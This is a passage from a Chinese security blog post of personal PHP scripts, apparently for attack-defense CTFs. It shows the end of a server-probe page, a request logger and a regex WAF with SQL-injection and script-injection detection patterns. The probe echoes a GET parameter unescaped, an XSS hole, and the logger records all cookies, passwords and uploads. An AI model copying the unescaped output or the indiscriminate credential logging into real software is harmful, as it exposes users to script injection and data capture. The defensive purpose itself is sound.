      &lt;td class=&quot;sudu&quot;  width=&quot;&lt;?php 
	if(preg_match(&quot;/[^\d-., ]/&quot;,$speed))
		&#123;
			echo &quot;0&quot;;
		&#125;
	else&#123;
			echo 550*($speed/11000);
		&#125; 
		?&gt;&quot;&gt;&lt;/td&gt;
      &lt;td class=&quot;suduk&quot; width=&quot;&lt;?php 
	if(preg_match(&quot;/[^\d-., ]/&quot;,$speed))
		&#123;
			echo &quot;550&quot;;
		&#125;
	else&#123;
			echo 550-550*($speed/11000);
		&#125; 
		?&gt;&quot;&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;/table&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;/table&gt;
  &lt;?php echo (isset($_GET['speed']))?&quot;下载1000KB数据用时 &lt;font color='#cc0000'&gt;&quot;.$_GET['speed'].&quot;&lt;/font&gt; 毫秒，下载速度：&quot;.&quot;&lt;font color='#cc0000'&gt;&quot;.$speed.&quot;&lt;/font&gt;&quot;.&quot; kb/s，需测试多次取平均值，超过10M直接看下载速度&quot;:&quot;&lt;font color='#cc0000'&gt;&amp;nbsp;未探测&amp;nbsp;&lt;/font&gt;&quot; ?&gt;

    &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

&lt;a name=&quot;w_MySQL&quot;&gt;&lt;/a&gt;

&lt;!--MySQL数据库连接检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;MySQL数据库连接检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;15%&quot;&gt;&lt;/td&gt;

    &lt;td width=&quot;60%&quot;&gt;

      地址：&lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;localhost&quot; size=&quot;10&quot; /&gt;

      端口：&lt;input type=&quot;text&quot; name=&quot;port&quot; value=&quot;3306&quot; size=&quot;10&quot; /&gt;

      用户名：&lt;input type=&quot;text&quot; name=&quot;login&quot; size=&quot;10&quot; /&gt;

      密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; size=&quot;10&quot; /&gt;

    &lt;/td&gt;

    &lt;td width=&quot;25%&quot;&gt;

      &lt;input class=&quot;btn&quot; type=&quot;submit&quot; name=&quot;act&quot; value=&quot;MySQL检测&quot; /&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

  &lt;?php

  if ($_POST['act'] == 'MySQL检测') &#123;

  	if(function_exists(&quot;mysql_close&quot;)==1) &#123;

  		$link = @mysql_connect($host.&quot;:&quot;.$port,$login,$password);

  		if ($link)&#123;

  			echo &quot;&lt;script&gt;alert('连接到MySql数据库正常')&lt;/script&gt;&quot;;

  		&#125; else &#123;

  			echo &quot;&lt;script&gt;alert('无法连接到MySql数据库！')&lt;/script&gt;&quot;;

  		&#125;

  	&#125; else &#123;

  		echo &quot;&lt;script&gt;alert('服务器不支持MySQL数据库！')&lt;/script&gt;&quot;;

  	&#125;

  &#125;

	?&gt;
	
&lt;a name=&quot;w_function&quot;&gt;&lt;/a&gt;

&lt;!--函数检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;函数检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;15%&quot;&gt;&lt;/td&gt;

    &lt;td width=&quot;60%&quot;&gt;

      请输入您要检测的函数：

      &lt;input type=&quot;text&quot; name=&quot;funName&quot; size=&quot;50&quot; /&gt;

    &lt;/td&gt;

    &lt;td width=&quot;25%&quot;&gt;

      &lt;input class=&quot;btn&quot; type=&quot;submit&quot; name=&quot;act&quot; align=&quot;right&quot; value=&quot;函数检测&quot; /&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

  &lt;?php

  if ($_POST['act'] == '函数检测') &#123;

  	echo &quot;&lt;script&gt;alert('$funRe')&lt;/script&gt;&quot;;

  &#125;

  ?&gt;

&lt;/table&gt;

&lt;a name=&quot;w_mail&quot;&gt;&lt;/a&gt;

&lt;!--邮件发送检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;邮件发送检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;15%&quot;&gt;&lt;/td&gt;

    &lt;td width=&quot;60%&quot;&gt;

      请输入您要检测的邮件地址：

      &lt;input type=&quot;text&quot; name=&quot;mailAdd&quot; size=&quot;50&quot; /&gt;

    &lt;/td&gt;

    &lt;td width=&quot;25%&quot;&gt;

    &lt;input class=&quot;btn&quot; type=&quot;submit&quot; name=&quot;act&quot; value=&quot;邮件检测&quot; /&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

  &lt;?php

  if ($_POST['act'] == '邮件检测') &#123;

  	echo &quot;&lt;script&gt;alert('$mailRe')&lt;/script&gt;&quot;;

  &#125;

  ?&gt;

&lt;/table&gt;

&lt;/form&gt;



	&lt;table&gt;
		&lt;tr&gt;
			&lt;td class=&quot;w_foot&quot;&gt;&lt;A HREF=&quot;http://www.Yahei.Net&quot; target=&quot;_blank&quot;&gt;&lt;?php echo $title.$version;?&gt;&lt;/A&gt;&lt;/td&gt;
			&lt;td class=&quot;w_foot&quot;&gt;&lt;?php $run_time = sprintf('%0.4f', microtime_float() - $time_start);?&gt;Processed in &lt;?php echo $run_time?&gt; seconds. &lt;?php echo memory_usage();?&gt; memory usage.&lt;/td&gt;
			&lt;td class=&quot;w_foot&quot;&gt;&lt;a href=&quot;#w_top&quot;&gt;返回顶部&lt;/a&gt;&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;

&lt;/div&gt;

&lt;/body&gt;

&lt;/html&gt;

</code></pre><h5 id="监控"><a class="anchor" href="#监控">#</a> 监控</h5><pre><code class="language-php">&lt;?php

error_reporting(0); 
define('LOG_FILEDIR','/tmp/loooooooogs');//日志文件目录
if(!is_dir(LOG_FILEDIR))&#123;//如果目录不存在则创建
	mkdir(LOG_FILEDIR);//创建目录
&#125;
function waf() 
&#123; 
if (!function_exists('getallheaders')) &#123; 
function getallheaders() &#123; //获取所有的头信息
foreach ($_SERVER as $name =&gt; $value) &#123; //循环获取所有的头信息
if (substr($name, 0, 5) == 'HTTP_') 
$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;//将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替
&#125; 
return $headers; 
&#125; 
&#125; 
$get = $_GET;//获取get参数 
$post = $_POST; //获取post参数
$cookie = $_COOKIE; //获取cookie参数
$header = getallheaders(); //获取所有的头信息
$files = $_FILES; //获取所有的上传文件信息
$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //获取客户端ip
$method = $_SERVER['REQUEST_METHOD']; //获取请求方式
$filepath = $_SERVER[&quot;SCRIPT_NAME&quot;]; //获取文件路径
foreach ($_FILES as $key =&gt; $value) &#123; //循环获取所有的上传文件信息
$files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); // 获取文件内容
file_put_contents($_FILES[$key]['tmp_name'], &quot;virink&quot;); //写入文件
&#125;

unset($header['Accept']);//删除头信息中的Accept
$input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header);//将所有的参数合并成一个数组

logging($input);//调用日志函数

&#125;

function logging($var)&#123; //日志函数
$filename = $_SERVER['REMOTE_ADDR'];//获取客户端ip
$LOG_FILENAME = LOG_FILEDIR.&quot;/&quot;.$filename;//日志文件路径
$time = date(&quot;Y-m-d G:i:s&quot;);//获取当前时间
file_put_contents($LOG_FILENAME, &quot;\r\n&quot;.$time.&quot;\r\n&quot;.print_r($var, true), FILE_APPEND); //写入日志文件

file_put_contents($LOG_FILENAME,&quot;\r\n&quot;.'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);//写入日志文件

file_put_contents($LOG_FILENAME,&quot;\r\n***************************************************************&quot;,FILE_APPEND);//写入日志文件
&#125;

waf(); 
?&gt;
</code></pre><h5 id="waf"><a class="anchor" href="#waf">#</a> waf</h5><pre><code class="language-php">&lt;!-- 
require_once('waf.php')

PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
--&gt;

&lt;?php

function customError($errno, $errstr, $errfile, $errline) &#123;
	echo &quot;&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;&quot;;
	die();
&#125;

set_error_handler(&quot;customError&quot;, E_ERROR);
$getfilter=&quot;'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
$postfilter=&quot;\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
$cookiefilter=&quot;\\b(and|or)\\b.&#123;1.6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
function DefendAttack($StrFiltKey, $StrFiltValue, $ArrFiltReq) &#123;
	if(is_array($StrFiltValue)) &#123;
		$StrFiltValue = implode($StrFiltValue);
	&#125;
	if(preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;, $StrFiltValue)==1) &#123;
		//slog(&quot;&lt;br&gt;&lt;br&gt;操作IP: &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;].&quot;&lt;br&gt;操作时间: &quot;.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;).&quot;&lt;br&gt;操作页面: &quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot;&lt;br&gt;提交方式: &quot;.$_SERVER[&quot;REQUEST_METHOD&quot;].&quot;&lt;br&gt;提交参数: &quot;.$StrFiltKey.&quot;&lt;br&gt;提交参数: &quot;.$StrFiltValue);
		print &quot;360WebSec notice: Illegal operation!&quot;;
		exit();
	&#125;
&#125;
//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);
foreach ($_GET as $key =&gt; $value) &#123;
	DefendAttack($key, $value, $getfilter);
&#125;
foreach ($_POST as $key =&gt; $value) &#123;
	DefendAttack($key, $value, $postfilter);
&#125;
foreach ($_COOKIE as $key =&gt; $value) &#123;
	DefendAttack($key, $value, $cookiefilter);
&#125;

if (file_exists(filename)) &#123;
	# code...
&#125;

function slog($logs) &#123;
	$toppath = $_SERVER[&quot;DOCUMENT_ROOT&quot;].&quot;/log.htm&quot;;
	$Ts=fopen($toppath, &quot;a+&quot;);
	fputs($Ts, $logs.&quot;\r\n&quot;);
	fclose($Ts);
&#125;

?&gt;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104122132974.png" alt="image-20221104122132974"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104123425661.png" alt="image-20221104123425661"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104125407895.png" alt="image-20221104125407895"></p><div class="tags"><a href="/tags/%E6%9D%82%E8%AE%B0/" rel="tag"><i class="ic i-tag"></i> 杂记</a></div></div><footer><div class="meta"><span id="2022/10/24/自用一些简单脚本记录/" class="item leancloud_visitors" data-flag-title="自用一些简单脚本记录" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/" title="自用一些简单脚本记录">https://blog.xcu.icu/2022/10/24/自用一些简单脚本记录/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/10/24/%E9%93%BE%E8%A1%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;92.jpg" title="顺序表"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 数据结构</span><h3>顺序表</h3></a></div><div class="item right"><a href="/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;59.jpg" title="文件上传小结"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Web</span><h3>文件上传小结</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4%E6%A0%BC%E5%BC%8F%E8%BD%AC%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">php 伪随机数爆破格式转化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">sql 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%A5%97%E5%A8%83"><span class="toc-number">3.</span> <span class="toc-text">压缩包套娃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E7%88%86%E5%85%A8%E5%86%85%E5%AE%B9hash"><span class="toc-number">4.</span> <span class="toc-text">部分爆全内容 hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#base%E9%9A%90%E5%86%99%E5%8A%A0%E5%AF%86"><span class="toc-number">5.</span> <span class="toc-text">base 隐写加密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#base%E9%9A%90%E5%86%99%E8%A7%A3%E5%AF%86"><span class="toc-number">6.</span> <span class="toc-text">base 隐写解密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E6%8E%A2%E9%92%88"><span class="toc-number">7.</span> <span class="toc-text">php 探针</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7"><span class="toc-number">8.</span> <span class="toc-text">监控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#waf"><span class="toc-number">9.</span> <span class="toc-text">waf</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/" rel="bookmark" title="自用一些简单脚本记录">自用一些简单脚本记录</a></li><li><a href="/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" rel="bookmark" title="hexo+github搭建个人博客">hexo+github搭建个人博客</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">57</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">40</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/10/24/%E9%93%BE%E8%A1%A8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/" title="php:&#x2F;&#x2F;filter过exit">php://filter过exit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Python/" title="分类于 Python">Python</a></div><span><a href="/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/" title="Python网络化编程">Python网络化编程</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="被动信息收集">被动信息收集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/05/24/CommonsCollections-6/" title="ConmonsCollection-6">ConmonsCollection-6</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/" title="记一次easy_cloudantivirus打靶记录">记一次easy_cloudantivirus打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/24/sql%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="分类于 数据库">数据库</a></div><span><a href="/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/" title="数据库设计">数据库设计</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/" title="基于sqli-labs前20关的SQL注入学习">基于sqli-labs前20关的SQL注入学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WP/" title="分类于 WP">WP</a></div><span><a href="/2023/04/05/GKCTF2020/" title="GKCTF2020WP">GKCTF2020WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" title="RMI浅记">RMI浅记</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">590k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:57</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/10/24/自用一些简单脚本记录/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->